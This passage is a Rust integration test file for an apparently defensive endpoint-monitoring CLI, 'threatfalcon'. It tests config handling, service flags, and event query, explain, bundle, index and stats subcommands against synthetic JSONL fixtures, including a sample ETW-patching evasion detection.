use assert_cmd::Command;
use predicates::prelude::*;
use std::fs;
use tempfile::TempDir;

fn cmd() -> Command {
    Command::cargo_bin("threatfalcon").unwrap()
}

/// Minimal valid JSONL event for investigation CLI tests.
/// Fields are hand-crafted to avoid pulling in the library crate.
fn sample_event(id: &str, pid: u32, process_key: &str, category: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"2026-03-13T10:00:00Z","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Network"}}}},"category":"{category}","severity":"Info","data":{{"type":"NetworkConnect","pid":{pid},"image_path":"","protocol":"TCP","src_addr":"10.0.0.1","src_port":12345,"dst_addr":"93.184.216.34","dst_port":443,"direction":"Outbound"}},"process_context":{{"process_key":"{process_key}"}}}}"#
    )
}

fn sample_detection_event(id: &str, rule_id: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"2026-03-13T10:00:00Z","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":"EvasionDetector","category":"Evasion","severity":"High","data":{{"type":"EvasionDetected","technique":"EtwPatching","pid":100,"process_name":"malware.exe","details":"patched"}},"rule":{{"id":"{rule_id}","name":"Test","description":"test","mitre":{{"tactic":"Defense Evasion","technique_id":"T1562.006","technique_name":"Indicator Blocking"}},"confidence":"High","evidence":["byte 0xC3"]}}}}"#
    )
}

#[test]
fn help_flag() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("--config")
            .and(predicate::str::contains("--stdout"))
            .and(predicate::str::contains("--output"))
            .and(predicate::str::contains("--validate-config"))
            .and(predicate::str::contains("--dump-default-config")),
    );
}

#[test]
fn version_flag() {
    cmd()
        .arg("--version")
        .assert()
        .success()
        .stdout(predicate::str::contains(env!("CARGO_PKG_VERSION")));
}

#[test]
fn dump_default_config() {
    cmd()
        .arg("--dump-default-config")
        .assert()
        .success()
        .stdout(
            predicate::str::contains("hostname")
                .and(predicate::str::contains("[output]"))
                .and(predicate::str::contains("[collectors.etw]"))
                .and(predicate::str::contains("[collectors.sysmon]"))
                .and(predicate::str::contains("[collectors.evasion]")),
        );
}

#[test]
fn dump_default_config_is_valid_toml() {
    let output = cmd()
        .arg("--dump-default-config")
        .output()
        .unwrap();
    assert!(output.status.success());
    let toml_str = String::from_utf8(output.stdout).unwrap();
    // Must parse back as valid TOML
    let _: toml::Value = toml::from_str(&toml_str).expect("dump output should be valid TOML");
}

#[test]
fn validate_config_with_valid_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("valid.toml");
    fs::write(&path, "hostname = \"TEST\"\n").unwrap();

    cmd()
        .args(["--config", path.to_str().unwrap(), "--validate-config"])
        .assert()
        .success()
        .stderr(predicate::str::contains("Config is valid"));
}

#[test]
fn validate_config_with_invalid_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("bad.toml");
    fs::write(&path, "invalid = [[[broken").unwrap();

    cmd()
        .args(["--config", path.to_str().unwrap(), "--validate-config"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("validation failed"));
}

#[test]
fn validate_config_missing_file_errors() {
    cmd()
        .args(["--config", "/nonexistent/path.toml", "--validate-config"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("not found"));
}

#[test]
fn stdout_and_output_conflict() {
    cmd()
        .args(["--stdout", "--output", "out.jsonl"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));
}

#[test]
fn service_flags_shown_in_help() {
    cmd()
        .arg("--help")
        .assert()
        .success()
        .stdout(
            predicate::str::contains("--service")
                .and(predicate::str::contains("--install-service"))
                .and(predicate::str::contains("--uninstall-service")),
        );
}

#[test]
fn service_and_stdout_conflict() {
    cmd()
        .args(["--service", "--stdout"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));
}

#[test]
fn service_and_output_conflict() {
    cmd()
        .args(["--service", "--output", "out.jsonl"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));
}

#[test]
#[cfg(not(target_os = "windows"))]
fn service_flag_rejected_on_non_windows() {
    cmd()
        .arg("--service")
        .assert()
        .failure()
        .stderr(predicate::str::contains("only supported on Windows"));
}

#[test]
#[cfg(not(target_os = "windows"))]
fn install_service_rejected_on_non_windows() {
    cmd()
        .arg("--install-service")
        .assert()
        .failure()
        .stderr(predicate::str::contains("only supported on Windows"));
}

#[test]
#[cfg(not(target_os = "windows"))]
fn uninstall_service_rejected_on_non_windows() {
    cmd()
        .arg("--uninstall-service")
        .assert()
        .failure()
        .stderr(predicate::str::contains("only supported on Windows"));
}

#[test]
fn install_service_conflicts_with_stdout() {
    cmd()
        .args(["--install-service", "--stdout"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));
}

#[test]
fn uninstall_service_conflicts_with_service() {
    cmd()
        .args(["--uninstall-service", "--service"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));
}

// ---- Investigation CLI tests ------------------------------------------------

#[test]
fn help_shows_subcommands() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("query")
            .and(predicate::str::contains("explain"))
            .and(predicate::str::contains("bundle")),
    );
}

#[test]
fn query_help() {
    cmd().args(["query", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--pid"))
            .and(predicate::str::contains("--process-key"))
            .and(predicate::str::contains("--category"))
            .and(predicate::str::contains("--rule-id"))
            .and(predicate::str::contains("--since"))
            .and(predicate::str::contains("--limit")),
    );
}

#[test]
fn explain_help() {
    cmd().args(["explain", "--help"]).assert().success().stdout(
        predicate::str::contains("--event")
            .and(predicate::str::contains("--input"))
            .and(predicate::str::contains("--window")),
    );
}

#[test]
fn bundle_help() {
    cmd().args(["bundle", "--help"]).assert().success().stdout(
        predicate::str::contains("--event")
            .and(predicate::str::contains("--input"))
            .and(predicate::str::contains("--window"))
            .and(predicate::str::contains("--output")),
    );
}

#[test]
fn query_returns_matching_events() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network"),
        sample_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "Network"),
        sample_event("cccccccc-cccc-cccc-cccc-cccccccccccc", 100, "100:42", "Network"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--pid", "100"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("aaaaaaaa")
                .and(predicate::str::contains("cccccccc"))
                .and(predicate::str::contains("bbbbbbbb").not()),
        )
        .stderr(predicate::str::contains("2 event(s) matched"));
}

#[test]
fn query_filter_by_category() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network"),
        sample_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "File"),
    ];
    // Fix File category event to have FileCreate data
    let file_event = r#"{"id":"bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb","timestamp":"2026-03-13T10:00:00Z","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{"Etw":{"provider":"Microsoft-Windows-Kernel-File"}},"category":"File","severity":"Info","data":{"type":"FileCreate","pid":200,"path":"C:\\test.txt","operation":"Create"},"process_context":{"process_key":"200:43"}}"#;
    fs::write(&path, format!("{}\n{file_event}\n", lines[0])).unwrap();

    cmd()
        .args([
            "query",
            "--input",
            path.to_str().unwrap(),
            "--category",
            "network",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("aaaaaaaa"))
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_filter_by_rule_id() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network"),
        sample_detection_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "TF-EVA-001"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args([
            "query",
            "--input",
            path.to_str().unwrap(),
            "--rule-id",
            "TF-EVA-001",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("bbbbbbbb"))
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_empty_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("empty.jsonl");
    fs::write(&path, "").unwrap();

    cmd()
        .args(["query", "--input", path.to_str().unwrap()])
        .assert()
        .success()
        .stderr(predicate::str::contains("0 event(s) matched"));
}

#[test]
fn query_missing_file() {
    cmd()
        .args(["query", "--input", "/nonexistent/file.jsonl"])
        .assert()
        .failure();
}

#[test]
fn explain_shows_event_detail() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let event_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    let lines = [
        sample_event(event_id, 100, "100:42", "Network"),
        sample_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, "100:42", "Network"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args([
            "explain",
            "--event",
            event_id,
            "--input",
            path.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("=== Target Event ===")
                .and(predicate::str::contains(event_id))
                .and(predicate::str::contains("=== Process Timeline")),
        );
}

#[test]
fn explain_prefix_match() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let event = sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network");
    fs::write(&path, &event).unwrap();

    cmd()
        .args([
            "explain",
            "--event",
            "aaaaaaaa", // prefix
            "--input",
            path.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"));
}

#[test]
fn explain_event_not_found() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let event = sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network");
    fs::write(&path, &event).unwrap();

    cmd()
        .args([
            "explain",
            "--event",
            "nonexistent",
            "--input",
            path.to_str().unwrap(),
        ])
        .assert()
        .failure();
}

#[test]
fn bundle_to_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    let output = dir.path().join("bundle.json");

    let event_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    let lines = [
        sample_event(event_id, 100, "100:42", "Network"),
        sample_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, "100:42", "Network"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args([
            "bundle",
            "--event",
            event_id,
            "--input",
            path.to_str().unwrap(),
            "--output",
            output.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stderr(predicate::str::contains("Bundle written to"));

    let content = fs::read_to_string(&output).unwrap();
    assert!(content.contains("\"bundle_version\""));
    assert!(content.contains(event_id));
    assert!(content.contains("\"related_events\""));
}

#[test]
fn bundle_to_stdout() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let event_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    let event = sample_event(event_id, 100, "100:42", "Network");
    fs::write(&path, &event).unwrap();

    cmd()
        .args([
            "bundle",
            "--event",
            event_id,
            "--input",
            path.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("\"bundle_version\"")
                .and(predicate::str::contains(event_id)),
        );
}

#[test]
fn bundle_to_zip() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    let zip_output = dir.path().join("bundle.zip");

    let event_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    let lines = [
        sample_event(event_id, 100, "100:42", "Network"),
        sample_event(
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            100,
            "100:42",
            "Network",
        ),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args([
            "bundle",
            "--event",
            event_id,
            "--input",
            path.to_str().unwrap(),
            "--output",
            zip_output.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stderr(
            predicate::str::contains("Bundle written to")
                .and(predicate::str::contains("zip")),
        );

    // Verify it's a valid zip with the expected entries
    let file = fs::File::open(&zip_output).unwrap();
    let mut archive = zip::ZipArchive::new(file).unwrap();
    assert_eq!(archive.len(), 4);

    for name in ["manifest.json", "target_event.json", "related_events.jsonl", "bundle.json"] {
        assert!(archive.by_name(name).is_ok(), "missing zip entry: {name}");
    }
}

// ---- PR #27: Investigation CLI filter extension tests -----------------------

fn sample_etw_event(id: &str, pid: u32, process_key: &str, category: &str, severity: &str, timestamp: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Network"}}}},"category":"{category}","severity":"{severity}","data":{{"type":"NetworkConnect","pid":{pid},"image_path":"","protocol":"TCP","src_addr":"10.0.0.1","src_port":12345,"dst_addr":"93.184.216.34","dst_port":443,"direction":"Outbound"}},"process_context":{{"process_key":"{process_key}"}}}}"#
    )
}

fn sample_evasion_event(id: &str, severity: &str, timestamp: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":"EvasionDetector","category":"Evasion","severity":"{severity}","data":{{"type":"EvasionDetected","technique":"EtwPatching","pid":100,"process_name":"malware.exe","details":"patched"}},"rule":{{"id":"TF-EVA-001","name":"Test","description":"test","mitre":{{"tactic":"Defense Evasion","technique_id":"T1562.006","technique_name":"Indicator Blocking"}},"confidence":"High","evidence":["byte 0xC3"]}}}}"#
    )
}

#[test]
fn query_filter_by_source_etw() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--source", "etw"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("aaaaaaaa")
                .and(predicate::str::contains("bbbbbbbb").not()),
        )
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_filter_by_source_evasion() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--source", "evasion"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("bbbbbbbb")
                .and(predicate::str::contains("aaaaaaaa").not()),
        )
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_filter_by_severity() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--severity", "high"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("bbbbbbbb")
                .and(predicate::str::contains("aaaaaaaa").not()),
        )
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_filter_by_contains() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--contains", "malware.exe"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("bbbbbbbb")
                .and(predicate::str::contains("aaaaaaaa").not()),
        )
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_filter_by_from_to() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T09:00:00Z"),
        sample_etw_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "Network", "Info", "2026-03-13T11:00:00Z"),
        sample_etw_event("cccccccc-cccc-cccc-cccc-cccccccccccc", 300, "300:44", "Network", "Info", "2026-03-13T13:00:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Only events between 10:00 and 12:00
    cmd()
        .args([
            "query",
            "--input", path.to_str().unwrap(),
            "--from", "2026-03-13T10:00:00Z",
            "--to", "2026-03-13T12:00:00Z",
        ])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("bbbbbbbb")
                .and(predicate::str::contains("aaaaaaaa").not())
                .and(predicate::str::contains("cccccccc").not()),
        )
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_since_alias_works() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T09:00:00Z"),
        sample_etw_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "Network", "Info", "2026-03-13T11:00:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // --since is an alias for --from
    cmd()
        .args([
            "query",
            "--input", path.to_str().unwrap(),
            "--since", "2026-03-13T10:00:00Z",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("bbbbbbbb"))
        .stderr(predicate::str::contains("1 event(s) matched"));
}

#[test]
fn query_help_shows_new_flags() {
    cmd().args(["query", "--help"]).assert().success().stdout(
        predicate::str::contains("--source")
            .and(predicate::str::contains("--severity"))
            .and(predicate::str::contains("--contains"))
            .and(predicate::str::contains("--from"))
            .and(predicate::str::contains("--to")),
    );
}

#[test]
fn explain_json_output() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let event_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    let lines = [
        sample_etw_event(event_id, 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_etw_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, "100:42", "Network", "Info", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args([
            "explain",
            "--event", event_id,
            "--input", path.to_str().unwrap(),
            "--json",
        ])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    // Must be valid JSON with expected fields
    let json: serde_json::Value = serde_json::from_str(&stdout).expect("explain --json should output valid JSON");
    assert!(json.get("target_event").is_some());
    assert!(json.get("timeline").is_some());
    assert!(json.get("window_minutes").is_some());
}

#[test]
fn explain_help_shows_json_flag() {
    cmd().args(["explain", "--help"]).assert().success().stdout(
        predicate::str::contains("--json"),
    );
}

// ---- Index subcommand tests -------------------------------------------------

#[test]
fn index_help() {
    cmd().args(["index", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--rebuild"))
            .and(predicate::str::contains("--status")),
    );
}

#[test]
fn help_shows_index_subcommand() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("index"),
    );
}

#[test]
fn index_build_creates_index_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    let event = sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network");
    fs::write(&path, &event).unwrap();

    cmd()
        .args(["index", "--input", path.to_str().unwrap()])
        .assert()
        .success()
        .stderr(
            predicate::str::contains("Indexed")
                .and(predicate::str::contains("1 new event(s)"))
                .and(predicate::str::contains("1 total")),
        );

    // Verify index file was created
    let idx_path = format!("{}.idx.sqlite", path.display());
    assert!(std::path::Path::new(&idx_path).exists(), "index file should be created");
}

#[test]
fn index_status_shows_health() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network"),
        sample_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "Network"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Build first
    cmd()
        .args(["index", "--input", path.to_str().unwrap()])
        .assert()
        .success();

    // Check status
    cmd()
        .args(["index", "--input", path.to_str().unwrap(), "--status"])
        .assert()
        .success()
        .stderr(
            predicate::str::contains("Events:")
                .and(predicate::str::contains("2"))
                .and(predicate::str::contains("current")),
        );
}

#[test]
fn index_rebuild_reindexes() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    let event = sample_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network");
    fs::write(&path, &event).unwrap();

    // Build
    cmd()
        .args(["index", "--input", path.to_str().unwrap()])
        .assert()
        .success();

    // Rebuild
    cmd()
        .args(["index", "--input", path.to_str().unwrap(), "--rebuild"])
        .assert()
        .success()
        .stderr(predicate::str::contains("1 new event(s)"));
}

#[test]
fn query_with_index_returns_same_results() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Build index
    cmd()
        .args(["index", "--input", path.to_str().unwrap()])
        .assert()
        .success();

    // Query with index (--severity high should return only the evasion event)
    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--severity", "high"])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("bbbbbbbb")
                .and(predicate::str::contains("aaaaaaaa").not()),
        )
        .stderr(predicate::str::contains("1 event(s) matched (indexed)"));
}

#[test]
fn query_no_index_forces_scan() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_evasion_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", "High", "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Build index
    cmd()
        .args(["index", "--input", path.to_str().unwrap()])
        .assert()
        .success();

    // Query with --no-index should use full scan (no "(indexed)" in output)
    cmd()
        .args(["query", "--input", path.to_str().unwrap(), "--severity", "high", "--no-index"])
        .assert()
        .success()
        .stdout(predicate::str::contains("bbbbbbbb"))
        .stderr(
            predicate::str::contains("1 event(s) matched")
                .and(predicate::str::contains("indexed").not()),
        );
}

#[test]
fn query_no_index_flag_shown_in_help() {
    cmd().args(["query", "--help"]).assert().success().stdout(
        predicate::str::contains("--no-index"),
    );
    cmd().args(["explain", "--help"]).assert().success().stdout(
        predicate::str::contains("--no-index"),
    );
    cmd().args(["bundle", "--help"]).assert().success().stdout(
        predicate::str::contains("--no-index"),
    );
}

/// Event without process_context — PID-based fallback should still work.
fn sample_event_no_context(id: &str, pid: u32, timestamp: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Network"}}}},"category":"Network","severity":"Info","data":{{"type":"NetworkConnect","pid":{pid},"image_path":"","protocol":"TCP","src_addr":"10.0.0.1","src_port":12345,"dst_addr":"93.184.216.34","dst_port":443,"direction":"Outbound"}}}}"#
    )
}

#[test]
fn explain_indexed_pid_fallback_no_process_context() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let target_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    // Two events with same PID but no process_context
    let lines = [
        sample_event_no_context(target_id, 100, "2026-03-13T10:00:00Z"),
        sample_event_no_context("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, "2026-03-13T10:01:00Z"),
        sample_event_no_context("cccccccc-cccc-cccc-cccc-cccccccccccc", 200, "2026-03-13T10:02:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Build index
    cmd()
        .args(["index", "--input", path.to_str().unwrap()])
        .assert()
        .success();

    // Explain with index — should fall back to PID and show timeline with 2 events (pid 100)
    cmd()
        .args([
            "explain",
            "--event", target_id,
            "--input", path.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("=== Target Event ===")
                .and(predicate::str::contains(target_id))
                .and(predicate::str::contains("pid:100"))
                .and(predicate::str::contains("2 events")),
        );
}

#[test]
fn explain_no_index_pid_fallback_no_process_context() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let target_id = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";
    let lines = [
        sample_event_no_context(target_id, 100, "2026-03-13T10:00:00Z"),
        sample_event_no_context("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 100, "2026-03-13T10:01:00Z"),
        sample_event_no_context("cccccccc-cccc-cccc-cccc-cccccccccccc", 200, "2026-03-13T10:02:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // Explain without index — same PID fallback
    cmd()
        .args([
            "explain",
            "--event", target_id,
            "--input", path.to_str().unwrap(),
            "--no-index",
        ])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("=== Target Event ===")
                .and(predicate::str::contains(target_id))
                .and(predicate::str::contains("pid:100"))
                .and(predicate::str::contains("2 events")),
        );
}

// ---- Stats subcommand tests -------------------------------------------------

#[test]
fn stats_help() {
    cmd().args(["stats", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--json")),
    );
}

#[test]
fn help_shows_stats_subcommand() {
    cmd().arg("--help").assert().success().stdout(
        predicate::str::contains("stats"),
    );
}

#[test]
fn stats_shows_summary() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_etw_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "Network", "Info", "2026-03-13T10:05:00Z"),
        sample_evasion_event("cccccccc-cccc-cccc-cccc-cccccccccccc", "High", "2026-03-13T10:10:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["stats", "--input", path.to_str().unwrap()])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("Total events: 3")
                .and(predicate::str::contains("By Category"))
                .and(predicate::str::contains("Network"))
                .and(predicate::str::contains("Evasion"))
                .and(predicate::str::contains("By Severity"))
                .and(predicate::str::contains("Info"))
                .and(predicate::str::contains("High"))
                .and(predicate::str::contains("By Source"))
                .and(predicate::str::contains("Top Processes")),
        );
}

#[test]
fn stats_shows_time_range() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_etw_event("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", 100, "100:42", "Network", "Info", "2026-03-13T10:00:00Z"),
        sample_etw_event("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb", 200, "200:43", "Network", "Info", "2026-03-13T12:30:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    cmd()
        .args(["stats", "--input", path.to_str().unwrap()])
        .assert()
        .success()
        .stdout(
            predicate::str::contains("Time range:")
                .and(predicate::str::contains("Duration:"))
                .and(predicate::str::contains("2h 30m")),
        );
}

#[test]
fn stats_shows_detection_rules() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
